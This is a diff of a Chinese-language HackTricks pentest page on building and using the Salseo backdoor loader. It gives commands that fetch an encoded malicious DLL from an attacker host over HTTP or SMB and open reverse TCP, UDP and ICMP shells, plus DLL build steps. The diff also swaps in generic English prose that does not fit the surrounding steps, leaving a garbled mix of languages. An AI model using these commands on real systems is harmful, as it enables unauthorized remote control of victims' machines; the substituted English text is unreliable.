@@ -4,10 +4,10 @@
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
 * 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获得[**官方PEASS和HackTricks的衣物**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* 获取[**官方PEASS和HackTricks的衣物**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
 
 </details>
@@ -39,33 +39,55 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 ```
 ### Windows
 
-#### Salseo
+#### Salseo Backdoor
 
-##### Salseo - Backdoor
+The Salseo backdoor is a type of malware that provides unauthorized access to a compromised Windows system. It is designed to remain hidden and undetected, allowing an attacker to maintain persistent control over the infected machine.
 
-###### Salseo - Persistence
+##### Functionality
 
-Salseo is a backdoor technique that allows an attacker to maintain access to a compromised Windows system. It achieves persistence by creating a new service or modifying an existing one to execute malicious code each time the system starts.
+Once installed on a target system, the Salseo backdoor establishes a covert communication channel with a remote command and control (C2) server. This allows the attacker to remotely execute commands on the compromised system and retrieve sensitive information.
 
-###### Salseo - Privilege Escalation
+The backdoor is capable of performing various malicious activities, including:
 
-Salseo can also be used to escalate privileges on a compromised Windows system. By exploiting vulnerabilities or misconfigurations, an attacker can gain higher privileges and access sensitive information or perform unauthorized actions.
+1. **Remote Access**: The attacker can gain full control over the infected system, enabling them to perform actions as if they were physically present.
 
-##### Salseo - Remote Access
+2. **Data Exfiltration**: The backdoor can steal sensitive data from the compromised system, such as login credentials, financial information, or intellectual property.
 
-Salseo can provide remote access to a compromised Windows system, allowing an attacker to control the system from a remote location. This can be achieved by creating a reverse shell or by using a remote administration tool (RAT) to establish a connection with the compromised system.
+3. **Keylogging**: Salseo can capture keystrokes, allowing the attacker to monitor and record user activities, including passwords and other confidential information.
 
-##### Salseo - Data Exfiltration
+4. **File Manipulation**: The backdoor can create, modify, or delete files on the compromised system, giving the attacker the ability to plant additional malware or tamper with existing files.
 
-Salseo can be used to exfiltrate data from a compromised Windows system. An attacker can use various techniques, such as uploading files to a remote server, sending data through a covert channel, or using a command and control (C2) server to retrieve sensitive information.
+5. **System Surveillance**: Salseo can gather system information, such as installed software, hardware details, and network configurations, providing the attacker with valuable insights for further exploitation.
 
-##### Salseo - Anti-Forensics
+##### Infection Vectors
 
-Salseo can employ anti-forensic techniques to evade detection and hinder forensic analysis. This can include deleting logs, modifying timestamps, encrypting data, or using steganography to hide information within innocent-looking files.
+The Salseo backdoor can be delivered through various infection vectors, including:
 
-##### Salseo - Countermeasures
+1. **Phishing Emails**: Malicious attachments or links in phishing emails can lead to the installation of the backdoor when clicked or opened.
 
-To defend against Salseo attacks, it is important to implement strong security measures. This includes keeping systems and software up to date, using strong passwords, monitoring network traffic for suspicious activity, and regularly conducting security audits and penetration testing. Additionally, employing endpoint protection solutions and intrusion detection systems can help detect and mitigate Salseo attacks.
+2. **Drive-by Downloads**: Visiting compromised or malicious websites can trigger the automatic download and execution of the backdoor without the user's knowledge.
+
+3. **Exploit Kits**: Salseo can be delivered through exploit kits that target vulnerabilities in outdated software or plugins, allowing the attacker to gain unauthorized access.
+
+4. **Malicious Downloads**: Downloading and executing files from untrusted sources can result in the installation of the backdoor.
+
+##### Detection and Prevention
+
+To detect and prevent the Salseo backdoor, it is recommended to:
+
+1. **Keep Software Updated**: Regularly update operating systems, applications, and plugins to patch known vulnerabilities.
+
+2. **Use Antivirus Software**: Employ reputable antivirus software that can detect and remove malware, including backdoors.
+
+3. **Exercise Caution with Email Attachments and Links**: Be cautious when opening email attachments or clicking on links, especially if they are unexpected or from unknown senders.
+
+4. **Enable Firewall and Intrusion Detection Systems**: Configure firewalls and intrusion detection systems to monitor and block suspicious network traffic.
+
+5. **Implement Least Privilege**: Limit user privileges to minimize the impact of a potential compromise.
+
+6. **Perform Regular Security Audits**: Conduct periodic security audits to identify and address any vulnerabilities in the system.
+
+By following these best practices, you can enhance the security of your Windows systems and reduce the risk of falling victim to the Salseo backdoor.
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
@@ -82,9 +104,9 @@ EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
-### **获取UDP反向Shell（通过SMB下载编码的dll）**
+### **获取UDP反向shell（通过SMB下载编码的dll）**
 
-记得启动一个nc作为反向Shell监听器，并启动一个SMB服务器来提供编码的evilsalsa（impacket-smbserver）。
+记得启动一个nc作为反向shell监听器，并启动一个SMB服务器来提供编码的evilsalsa（impacket-smbserver）。
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
@@ -103,19 +125,17 @@ sysctl -w net.ipv4.icmp_echo_ignore_all=0
 
 To execute the client, you need to follow these steps:
 
-1. Compile the client code into an executable file.
-2. Transfer the executable file to the target machine.
-3. Run the executable file on the target machine.
+1. Make sure you have the client file downloaded and saved on your local machine.
 
-Here is a detailed explanation of each step:
+2. Open a terminal or command prompt.
 
-1. **Compile the client code into an executable file**: Use a compiler or an integrated development environment (IDE) to compile the client code into an executable file. Make sure to choose the appropriate compiler or IDE based on the programming language used to develop the client.
+3. Navigate to the directory where the client file is located using the `cd` command.
 
-2. **Transfer the executable file to the target machine**: Use a secure file transfer method, such as Secure Copy Protocol (SCP) or File Transfer Protocol (FTP), to transfer the compiled executable file to the target machine. Ensure that you have the necessary permissions and access to the target machine.
+4. Once you are in the correct directory, run the client file by typing its name followed by the appropriate command. For example, if the client file is named `client.exe`, you would type `client.exe` and press Enter.
 
-3. **Run the executable file on the target machine**: Once the executable file is transferred to the target machine, navigate to the directory where the file is located using the command line interface. Then, execute the file by running the appropriate command based on the operating system and file type. For example, on Windows, you can use the `start` command followed by the file name, while on Linux, you can use the `./` prefix followed by the file name.
+5. The client will then execute and start running on your machine.
 
-By following these steps, you will be able to successfully execute the client on the target machine.
+Remember to exercise caution when executing any files, especially those obtained from untrusted sources. Always scan files for malware before running them.
 ```
 python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
@@ -127,59 +147,57 @@ SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 
 使用Visual Studio打开SalseoLoader项目。
 
-### 在主函数之前添加：\[DllExport]
+在主函数之前添加\[DllExport]。
 
-![](<../.gitbook/assets/image (2) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1).png>)
 
-### 为该项目安装DllExport
+为该项目安装DllExport。
 
-#### **工具** --> **NuGet程序包管理器** --> **管理解决方案的NuGet程序包...**
+选择**工具** --> **NuGet程序包管理器** --> **管理解决方案的NuGet程序包...**
 
 ![](<../.gitbook/assets/image (3) (1) (1) (1) (1).png>)
 
-#### **搜索DllExport包（使用浏览选项卡），然后点击安装（并接受弹出窗口）**
+在浏览选项卡中搜索DllExport程序包，并点击安装（接受弹出窗口）。
 
 ![](<../.gitbook/assets/image (4) (1) (1) (1) (1).png>)
 
-在项目文件夹中会出现以下文件：**DllExport.bat**和**DllExport\_Configure.bat**
+在项目文件夹中会出现**DllExport.bat**和**DllExport_Configure.bat**文件。
 
-### **卸载** DllExport
+卸载DllExport。
 
-点击**卸载**（是的，很奇怪，但相信我，这是必要的）
+点击**卸载**（是的，很奇怪，但请相信我，这是必要的）。
 
 ![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)
 
-### **退出Visual Studio并执行DllExport\_configure**
+退出Visual Studio并执行DllExport_Configure。
 
-只需**退出**Visual Studio
+只需退出Visual Studio，然后转到您的SalseoLoader文件夹并执行DllExport_Configure.bat。
 
-然后，转到**SalseoLoader文件夹**并**执行DllExport\_Configure.bat**
-
-选择**x64**（如果您将在x64系统中使用它，这是我的情况），选择**System.Runtime.InteropServices**（在**DllExport的命名空间**中）并点击**应用**
+选择**x64**（如果您将在x64系统中使用它，这是我的情况），选择**System.Runtime.InteropServices**（在**DllExport的命名空间**中）并点击**应用**。
 
 ![](<../.gitbook/assets/image (7) (1) (1) (1).png>)
 
-### **再次使用Visual Studio打开项目**
+再次使用Visual Studio打开项目。
 
-**\[DllExport]**不再被标记为错误
+\[DllExport]不再标记为错误。
 
 ![](<../.gitbook/assets/image (8) (1).png>)
 
-### 构建解决方案
+构建解决方案。
 
-选择**输出类型=类库**（项目 --> SalseoLoader属性 --> 应用程序 --> 输出类型=类库）
+选择**输出类型=类库**（项目 --> SalseoLoader属性 --> 应用程序 --> 输出类型=类库）。
 
 ![](<../.gitbook/assets/image (10) (1).png>)
 
-选择**x64平台**（项目 --> SalseoLoader属性 --> 构建 --> 平台目标=x64）
+选择**x64平台**（项目 --> SalseoLoader属性 --> 构建 --> 平台目标=x64）。
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
-要**构建**解决方案：构建 --> 构建解决方案（在输出控制台中将显示新DLL的路径）
+构建解决方案：构建 --> 构建解决方案（在输出控制台中将显示新DLL的路径）。
 
-### 测试生成的DLL
+测试生成的DLL
 
-将DLL复制并粘贴到要测试的位置。
+将DLL复制并粘贴到要进行测试的位置。
 
 执行：
 ```
@@ -187,7 +205,7 @@ rundll32.exe SalseoLoader.dll,main
 ```
 如果没有出现错误，那么你可能有一个功能正常的DLL！！
 
-## 使用DLL获取shell
+## 使用DLL获取一个shell
 
 不要忘记使用一个**HTTP** **服务器**并设置一个**nc** **监听器**
 
@@ -202,47 +220,13 @@ rundll32.exe SalseoLoader.dll,main
 ```
 ### CMD
 
-CMD（命令提示符）是Windows操作系统中的命令行工具。它允许用户通过键入命令来与操作系统进行交互。CMD提供了许多内置命令和功能，可以用于执行各种任务，如文件和文件夹操作、网络配置、进程管理等。
+CMD (Command Prompt) is a command-line interpreter in Windows operating systems. It provides a text-based interface for executing commands and managing the system. CMD can be used to perform various tasks, such as navigating through directories, running programs, and managing files and processes.
 
-#### 常用CMD命令
+CMD is a powerful tool for hackers as it allows them to execute commands and scripts on a target system. By gaining access to CMD, hackers can exploit vulnerabilities, escalate privileges, and gain control over the target system.
 
-以下是一些常用的CMD命令：
+To access CMD, simply open the Start menu, type "cmd" in the search bar, and press Enter. This will open the Command Prompt window, where you can start executing commands.
 
-- `dir`：列出当前目录中的文件和文件夹。
-- `cd`：更改当前目录。
-- `mkdir`：创建新的文件夹。
-- `del`：删除文件。
-- `copy`：复制文件。
-- `ipconfig`：显示网络配置信息。
-- `tasklist`：显示当前运行的进程列表。
-- `ping`：测试与另一个主机的连接。
-- `shutdown`：关闭计算机。
-
-#### CMD后门
-
-CMD后门是一种通过操纵CMD命令行工具来实现远程访问和控制目标计算机的方法。攻击者可以使用CMD后门来执行恶意操作，如窃取敏感信息、操纵文件和文件夹、执行远程命令等。
-
-以下是一些常见的CMD后门技术：
-
-- `netcat`：使用Netcat工具在目标计算机上监听端口，以便远程访问和控制。
-- `psexec`：使用PsExec工具在目标计算机上执行远程命令。
-- `wmic`：使用Windows Management Instrumentation Command-line（WMIC）工具执行远程管理任务。
-- `regsvr32`：使用Regsvr32工具加载恶意DLL文件并执行远程命令。
-
-#### 防御措施
-
-为了防止CMD后门攻击，可以采取以下措施：
-
-- 定期更新操作系统和安全补丁，以修复已知的漏洞。
-- 使用防火墙和入侵检测系统来监控网络流量和检测异常行为。
-- 限制对CMD工具的访问权限，只允许授权用户使用。
-- 使用强密码和多因素身份验证来保护管理员账户。
-- 定期审查系统日志，以便及时发现异常活动。
-- 使用安全软件和反恶意软件工具来检测和清除潜在的后门。
-
-#### 总结
-
-CMD是Windows操作系统中的命令行工具，可用于执行各种任务。然而，CMD后门是一种潜在的安全威胁，攻击者可以利用它来远程访问和控制目标计算机。为了保护系统安全，需要采取适当的防御措施来防止CMD后门攻击。
+It is important to note that CMD should only be used for legitimate purposes, such as system administration or troubleshooting. Using CMD for malicious activities is illegal and unethical. Always ensure that you have proper authorization before using CMD on a system.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
@@ -253,12 +237,12 @@ rundll32.exe SalseoLoader.dll,main
 ```
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 你在一家 **网络安全公司** 工作吗？想要在 HackTricks 中 **宣传你的公司** 吗？或者你想要获得 **PEASS 的最新版本或下载 HackTricks 的 PDF** 吗？请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获得 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
-* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass)，或者在 **Twitter** 上 **关注** 我 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**
+* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**推特**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
 
 </details>
